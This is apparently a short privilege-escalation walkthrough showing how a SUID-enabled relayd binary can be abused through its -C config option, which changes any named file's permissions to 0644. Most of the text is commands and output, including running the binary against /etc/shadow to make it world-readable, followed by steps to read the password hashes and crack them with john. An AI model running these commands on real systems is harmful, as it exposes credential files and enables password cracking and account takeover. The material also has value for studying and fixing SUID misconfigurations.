# Example

In this example we will see how SUID enabled application can be exploited to get advantage and gain some foothold.

Let's have a look at the help menu of relayd.

```bash
    /usr/sbin/relayd --help
    Usage: relayd [options] [actions]
    Actions:
    default action      start daemon
    -h                  show this help message
    -v                  show version info
    -k                  kill running daemon
    -s                  get running status
    -U                  hup (reload configs)
    -a [service]        add service for relay
    -r [service]        remove service for relay
    -i                  get real client ip
    -b [up|down]        broadcast the DS boot state
    -R                  reopen the log file
    Options:
    -C [file]           read config from file
    -d                  enable debug mode. will not run in background
    -P [file]           set pid file for daemon
    -g [ip]             remote source ip
    -n [port]           remote source port
``` 

```
    $ touch temp
    touch temp

    $ /usr/sbin/relayd -C temp
    /usr/sbin/relayd -C temp
    [ERR] 2022-03-10 00:34:00 config.cpp:1539 write
    [ERR] 2022-03-10 00:34:00 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
    [ERR] 2022-03-10 00:34:00 config.cpp:1189 bad json format [temp]
    [ERR] 2022-03-10 00:34:00 invalid config file
```
File permission changed^^


Validate
```
    $ strace /usr/sbin/relayd -C tempfile
    ...
    ...
    fchmodat(AT_FDCWD, "tempfile", 0644)    = 0
    ...
    ...
```

Since the binary has the SUID bit set, we can abuse this misconfiguration to modify file permissions and read /etc/shadow.

```$ /usr/sbin/relayd -C /etc/shadow

[ERR] 2022-03-10 00:39:08 config.cpp:1539 write
[ERR] 2022-03-10 00:39:08 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2022-03-10 00:39:08 config.cpp:1189 bad json format [/etc/shadow]
[ERR] 2022-03-10 00:39:08 invalid config file

$ ls -l /etc/shadow
ls -l /etc/shadow
-rw-r--r-- 1 root shadow 940 Jan 10 23:25 /etc/shadow
```

Now we can use further tools/techniques.

1. Read passwd & shadow
1. Crack password [using john]
